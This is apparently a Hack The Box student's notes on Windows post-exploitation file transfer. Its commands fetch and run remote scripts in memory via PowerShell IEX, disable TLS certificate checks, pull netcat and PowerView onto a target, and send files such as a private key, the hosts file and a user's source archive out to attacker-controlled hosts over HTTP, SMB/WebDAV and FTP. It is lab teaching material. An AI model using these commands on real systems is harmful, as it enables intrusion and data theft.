## **Windows File Transfer Methods**

<img width="1024" height="559" alt="image" src="https://github.com/user-attachments/assets/18832215-5103-4cdb-843f-1e049b6c3f1e" />

### **1. PowerShell Base64 Encode & Decode**

**Step 1 – Check MD5**

On Linux: (Verify the transferred file is identical.)

```bash
md5sum id_rsa
```

**Step 2 – Encode File**

```bash
cat id_rsa | base64 -w 0
```

Copy the Base64 output.

**Step 3 – Decode on Windows**

```powershell
[IO.File]::WriteAllBytes(
"C:\Users\Public\id_rsa",
[Convert]::FromBase64String("<base64>")
)
```

**Step 4 – Verify MD5**

```
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

Hash should match Linux.

**Limitation :** `cmd.exe` maximum command length: 8191 characters , Large Base64 strings may fail.

### 2. PowerShell Web Downloads

**Net.WebClient Methods**

| Method | Purpose |
| --- | --- |
| OpenRead | Returns Stream |
| OpenReadAsync | Async Stream |
| DownloadData | Returns byte array |
| DownloadDataAsync | Async byte array |
| DownloadFile | Save file locally |
| DownloadFileAsync | Async file download |
| DownloadString | Returns string |
| DownloadStringAsync | Async string |

**DownloadFile :** 

```powershell
(New-Object Net.WebClient).DownloadFile(URL, OUTPUT)
```

```powershell
(New-Object Net.WebClient).DownloadFile(
'https://.../PowerView.ps1',
'C:\Users\Public\Downloads\PowerView.ps1'
)
```

**DownloadFileAsync :** Downloads without blocking PowerShell.

```powershell
(New-Object Net.WebClient).DownloadFileAsync(URL, OUTPUT)
```

**Fileless Download (DownloadString + IEX) :** Instead of saving a script: Download , Execute directly in memory

```powershell
IEX (New-Object Net.WebClient).DownloadString(URL)
```

```powershell
(New-Object Net.WebClient).DownloadString(URL) | IEX
```

No script is written to disk.

**Invoke-WebRequest :** Available from PowerShell 3.0. Aliases: iwr , curl , wget

Example:

```powershell
Invoke-WebRequest URL -OutFile PowerView.ps1
```

**Common PowerShell Error : Internet Explorer Engine Error**

Error:

```
The response content cannot be parsed...
```

Fix:

```powershell
Invoke-WebRequest URL -UseBasicParsing
```

**SSL/TLS Trust Error :** 

Error:

```
Could not establish trust relationship...
```

Fix:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
```

### **SMB Downloads**

**Create SMB Server :** Without authentication:

```powershell
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

**Download File**

```powershell
copy \\IP\share\nc.exe
```

**SMB with Authentication :** Create server:

```powershell
sudo impacket-smbserver share \
-smb2support \
/tmp/smbshare \
-user test \
-password test
```

**Mount** : `net use n: \\IP\share /user:test test`

**Copy** : `copy n:\nc.exe`

### FTP Downloads

Install FTP Server : `sudo pip3 install pyftpdlib`

Run : `sudo python3 -m pyftpdlib --port 21` 

Download Using PowerShell:

```powershell
(New-Object Net.WebClient).DownloadFile(
'ftp://IP/file.txt',
'C:\Users\Public\ftp-file.txt'
)
```

When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.

**Create a Command File for the FTP Client and Download the Target File**

```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

## **Upload Operations**

### **PowerShell Base64 Encode & Decode**

**Encode File Using PowerShell**

```powershell
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))


PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```

**Decode Base64 String in Linux**

```bash
00Luffy00@htb[/htb]$ echo  | base64 -d > hosts
```

### **PowerShell Web Uploads**

**Installing a Configured WebServer with Upload**

```bash
00Luffy00@htb[/htb]$ pip3 install uploadserver
....
....
00Luffy00@htb[/htb]$ python3 -m uploadserver
```

**PowerShell Script to Upload a File to Python Upload Server**

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

**PowerShell Base64 Web Upload**

```powershell
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.

```bash
00Luffy00@htb[/htb]$ nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive


...SNIP...
```

```bash
00Luffy00@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
```

### **SMB Uploads**

An alternative is to run SMB over HTTP with `WebDav` 

**Configuring WebDav Server**

```bash
00Luffy00@htb[/htb]$ sudo pip3 install wsgidav cheroot
```

**Using the WebDav Python module**

```bash
00Luffy00@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

**Connecting to the Webdav Share**

```bash
C:\htb> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free

```

**Uploading Files using SMB**

```bash
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

### **FTP Uploads**

we need to specify the option `--write` to allow clients to upload files to our attack host.

```bash
00Luffy00@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
```

**PowerShell Upload File**

```powershell
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

**Create a Command File for the FTP Client to Upload a File**

```bash
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.

ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
